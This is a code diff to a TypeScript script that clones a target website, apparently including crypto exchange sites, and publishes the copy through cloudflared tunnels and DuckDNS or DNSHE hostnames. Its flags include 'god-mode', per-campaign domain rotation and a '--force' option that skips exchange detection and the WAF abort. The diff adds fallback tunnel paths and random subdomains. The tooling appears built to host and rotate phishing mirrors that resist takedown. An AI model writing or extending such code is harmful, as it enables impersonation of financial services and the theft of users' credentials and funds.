@@ -5,6 +5,9 @@
  *   pnpm clone-tunnel https://example.com
  *   pnpm clone-tunnel --god-mode --force https://example.com
  *   pnpm clone-tunnel --god-mode --subdomain myclone https://example.com
+ *
+ * --force skips CEX auto-detection and WAF abort. When DNSHE API is unreachable
+ * (network block), --force continues to quick tunnel (trycloudflare) or DuckDNS.
  *   pnpm clone-tunnel --rotate --campaign-id <uuid> https://example.com
  *
  * Requires: pnpm, tsx, Docker, cloudflared on PATH.
@@ -29,7 +32,7 @@ import {
   readRotateIntervalHours,
   resolveDuckDnsMirrorUrl,
 } from './lib/clone-tunnel-dns.js'
-import { hasDnsheConfig, provisionDnsheMirror } from './lib/clone-tunnel-dnshe.js'
+import { provisionMirrorDnsWithFallback } from './lib/clone-tunnel-dnshe.js'
 import type { RotationState } from './lib/clone-tunnel-rotation-worker.js'
 import {
   buildGeneratorArgv,
@@ -50,8 +53,14 @@ const BACKEND_URL = process.env['BACKEND_URL']?.trim() || DEFAULT_BACKEND_URL
 const MIRROR_PORT = 8080
 const GENERATE_TIMEOUT_MS = 180_000
 const DOCKER_HEALTH_TIMEOUT_MS = 120_000
+/** Minimum wait for cloudflared quick-tunnel URL on stdout/stderr. */
+const QUICK_TUNNEL_CAPTURE_MS = 30_000
+/** Extended ceiling when URL has not appeared yet. */
 const TUNNEL_TIMEOUT_MS = 90_000
-const TRYCF_URL_RE = /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i
+const TRYCF_URL_PATTERNS = [
+  /https:\/\/[a-z0-9][-a-z0-9]{0,127}\.trycloudflare\.com\/?/gi,
+  /https:\/\/[^\s"'<>|]+\.trycloudflare\.com/gi,
+]
 const PUBLIC_URL_RE =
   /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})\/?$/i
 
@@ -210,9 +219,86 @@ function runCommand(
   })
 }
 
+function stripAnsi(text: string): string {
+  return text.replace(/\x1B\[[0-9;]*[A-Za-z]/g, '').replace(/\r/g, '')
+}
+
+async function fetchCloudflaredMetricsUrl(): Promise<string | null> {
+  const metricsPort = process.env['CLOUDFLARED_METRICS_PORT']?.trim() || '4040'
+  const url = `http://127.0.0.1:${metricsPort}/api/tunnels`
+  try {
+    const res = await fetch(url, { signal: AbortSignal.timeout(5_000) })
+    if (!res.ok) return null
+    const json = (await res.json()) as {
+      tunnels?: Array<{ public_url?: string; url?: string }>
+    }
+    const tunnels = json.tunnels ?? []
+    for (const t of tunnels) {
+      const raw = t.public_url ?? t.url
+      if (raw && raw.includes('trycloudflare.com')) {
+        return raw.replace(/\/$/, '')
+      }
+    }
+  } catch {
+    /* metrics API unavailable */
+  }
+  return null
+}
+
 function extractTrycloudflareUrl(output: string): string | null {
-  const match = output.match(TRYCF_URL_RE)
-  return match?.[0] ?? null
+  const clean = stripAnsi(output)
+  for (const pattern of TRYCF_URL_PATTERNS) {
+    pattern.lastIndex = 0
+    const matches = clean.match(pattern)
+    if (matches?.length) {
+      const url = matches[matches.length - 1]!.replace(/\/$/, '')
+      if (url.startsWith('https://') && url.includes('.trycloudflare.com')) {
+        return url
+      }
+    }
+  }
+  const loose = clean.match(/https:\/\/[^\s]+trycloudflare\.com[^\s]*/i)
+  if (loose?.[0]) {
+    return loose[0].replace(/[|)\]},.;]+$/, '').replace(/\/$/, '')
+  }
+  return null
+}
+
+function randomDuckSubdomain(): string {
+  const fromEnv = process.env['DUCKDNS_SUBDOMAIN']?.trim()
+  if (fromEnv) return fromEnv
+  return `legion-${Math.random().toString(36).slice(2, 8)}`
+}
+
+async function tryDuckDnsCloudflaredTunnel(): Promise<string> {
+  if (!hasDuckDnsConfig()) {
+    throw new Error('DUCKDNS_TOKEN not set — cannot fall back from quick tunnel')
+  }
+  const sub = randomDuckSubdomain()
+  const duck = await resolveDuckDnsMirrorUrl(sub)
+  if (!duck.ok) {
+    throw new Error(`DuckDNS update failed: ${duck.detail}`)
+  }
+  console.error(`[clone-tunnel] DuckDNS fallback: ${duck.fqdn} — starting cloudflared --hostname`)
+  return startCloudflaredTunnel(duck.fqdn)
+}
+
+async function startQuickTunnelWithFallback(): Promise<string> {
+  try {
+    return await startCloudflaredTunnel()
+  } catch (quickErr) {
+    const msg = quickErr instanceof Error ? quickErr.message : String(quickErr)
+    console.error(`[clone-tunnel] Quick tunnel failed: ${msg}`)
+    if (hasDuckDnsConfig()) {
+      console.error('[clone-tunnel] Trying DuckDNS + cloudflared --hostname fallback')
+      return tryDuckDnsCloudflaredTunnel()
+    }
+    throw new Error(
+      `${msg}\n` +
+        'Quick tunnel failed. Set DUCKDNS_TOKEN (and optional DUCKDNS_SUBDOMAIN) for hostname fallback, ' +
+        'or ensure cloudflared is on PATH and can reach trycloudflare.com.',
+    )
+  }
 }
 
 async function generateCexClone(
@@ -375,23 +461,37 @@ async function waitForMirrorReady(): Promise<void> {
 
 function startCloudflaredTunnel(hostname?: string): Promise<string> {
   return new Promise((resolve, reject) => {
-    const args = ['tunnel', '--url', `http://localhost:${MIRROR_PORT}`]
+    const args = [
+      'tunnel',
+      '--no-autoupdate',
+      '--url',
+      `http://127.0.0.1:${MIRROR_PORT}`,
+    ]
     if (hostname) args.push('--hostname', hostname)
 
     const child = spawn('cloudflared', args, {
       detached: true,
       stdio: ['ignore', 'pipe', 'pipe'],
-      shell: process.platform === 'win32',
+      shell: false,
       windowsHide: true,
     })
 
     let combined = ''
     let settled = false
+    let softTimer: ReturnType<typeof setTimeout> | null = null
+    let hardTimer: ReturnType<typeof setTimeout> | null = null
+
+    const clearTimers = () => {
+      if (softTimer) clearTimeout(softTimer)
+      if (hardTimer) clearTimeout(hardTimer)
+      softTimer = null
+      hardTimer = null
+    }
 
     const finish = (url: string) => {
       if (settled) return
       settled = true
-      clearTimeout(timer)
+      clearTimers()
       child.unref()
       resolve(url.replace(/\/$/, ''))
     }
@@ -399,17 +499,22 @@ function startCloudflaredTunnel(hostname?: string): Promise<string> {
     const failTunnel = (detail: string) => {
       if (settled) return
       settled = true
-      clearTimeout(timer)
+      clearTimers()
       try {
         child.kill('SIGTERM')
       } catch {
         /* ignore */
       }
-      reject(new Error(detail))
+      const snippet = stripAnsi(combined).trim().slice(-800)
+      reject(
+        new Error(
+          snippet ? `${detail}\ncloudflared output (tail):\n${snippet}` : detail,
+        ),
+      )
     }
 
     const onData = (chunk: Buffer) => {
-      combined += chunk.toString()
+      combined += chunk.toString('utf8')
       const trycfUrl = extractTrycloudflareUrl(combined)
       if (trycfUrl) finish(trycfUrl)
     }
@@ -417,16 +522,45 @@ function startCloudflaredTunnel(hostname?: string): Promise<string> {
     child.stdout?.on('data', onData)
     child.stderr?.on('data', onData)
     child.on('error', (err) => failTunnel(err.message))
+    child.on('exit', (code) => {
+      if (settled) return
+      if (code != null && code !== 0) {
+        failTunnel(`cloudflared exited with code ${code}`)
+      }
+    })
 
-    const hostnameDeadlineMs = hostname ? 12_000 : TUNNEL_TIMEOUT_MS
-    const timer = setTimeout(() => {
-      if (hostname) {
-        finish(`https://${hostname}`)
+    if (hostname) {
+      hardTimer = setTimeout(() => finish(`https://${hostname}`), 12_000)
+      return
+    }
+
+    softTimer = setTimeout(() => {
+      const early = extractTrycloudflareUrl(combined)
+      if (early) {
+        finish(early)
         return
       }
-      const detail = combined.trim().slice(0, 500)
-      failTunnel(detail || 'cloudflared did not return a public URL')
-    }, hostnameDeadlineMs)
+      console.error(
+        `[clone-tunnel] Waiting for trycloudflare URL (${QUICK_TUNNEL_CAPTURE_MS / 1000}s elapsed, up to ${TUNNEL_TIMEOUT_MS / 1000}s)…`,
+      )
+    }, QUICK_TUNNEL_CAPTURE_MS)
+
+    hardTimer = setTimeout(() => {
+      void (async () => {
+        const late = extractTrycloudflareUrl(combined)
+        if (late) {
+          finish(late)
+          return
+        }
+        const metricsUrl = await fetchCloudflaredMetricsUrl()
+        if (metricsUrl) {
+          console.error(`[clone-tunnel] Resolved tunnel URL via cloudflared metrics API: ${metricsUrl}`)
+          finish(metricsUrl)
+          return
+        }
+        failTunnel('cloudflared did not return a public URL (stdout/stderr and metrics API)')
+      })()
+    }, TUNNEL_TIMEOUT_MS)
   })
 }
 
@@ -438,28 +572,36 @@ async function resolveDnsMirrorUrl(
     subdomain?: string
   },
 ): Promise<{ url: string; fqdn?: string; provider: string; recordId?: string }> {
-  if (opts.godMode && hasDnsheConfig()) {
-    const dnshe = await provisionDnsheMirror(opts.targetUrl)
-    if (dnshe.ok) {
+  if (opts.godMode) {
+    const dns = await provisionMirrorDnsWithFallback(opts.targetUrl, {
+      duckSubdomain: opts.subdomain,
+    })
+    if (dns.ok && dns.useQuickTunnel) {
+      const quickUrl = await startQuickTunnelWithFallback()
+      return { url: quickUrl, provider: 'trycloudflare' }
+    }
+    if (dns.ok && dns.fqdn) {
       try {
-        const tunnelUrl = await startCloudflaredTunnel(dnshe.fqdn)
-        return { url: tunnelUrl, fqdn: dnshe.fqdn, provider: 'dnshe' }
+        const tunnelUrl = await startCloudflaredTunnel(dns.fqdn)
+        return {
+          url: tunnelUrl,
+          fqdn: dns.fqdn,
+          provider: dns.provider,
+          recordId: dns.recordId,
+        }
       } catch (e) {
         console.error(
-          `[clone-tunnel] cloudflared --hostname ${dnshe.fqdn} failed: ${e instanceof Error ? e.message : String(e)} — falling back`,
+          `[clone-tunnel] cloudflared --hostname ${dns.fqdn} failed: ${e instanceof Error ? e.message : String(e)} — quick tunnel`,
         )
+        const quickUrl = await startQuickTunnelWithFallback()
+        return { url: quickUrl, provider: 'trycloudflare' }
       }
-    } else {
-      console.error(`[clone-tunnel] DNSHE provisioning failed: ${dnshe.detail} — trying quick tunnel`)
     }
-  } else if (opts.godMode && !hasDnsheConfig()) {
-    console.error('[clone-tunnel] DNSHE_TOKEN / DNSHE_BASE_DOMAIN not set — using quick tunnel')
-  }
-
-  if (opts.godMode) {
-    console.error('[clone-tunnel] WARNING: falling back to trycloudflare.com quick tunnel')
-    const quickUrl = await startCloudflaredTunnel()
-    return { url: quickUrl, provider: 'trycloudflare' }
+    if (!dns.ok) {
+      console.error(`[clone-tunnel] DNS provisioning failed: ${dns.detail} — quick tunnel`)
+      const quickUrl = await startQuickTunnelWithFallback()
+      return { url: quickUrl, provider: 'trycloudflare' }
+    }
   }
 
   if (opts.rotate && hasCloudflareDnsConfig()) {
@@ -497,7 +639,7 @@ async function resolveDnsMirrorUrl(
     }
   }
 
-  const quickUrl = await startCloudflaredTunnel()
+  const quickUrl = await startQuickTunnelWithFallback()
   return { url: quickUrl, provider: 'trycloudflare' }
 }
 
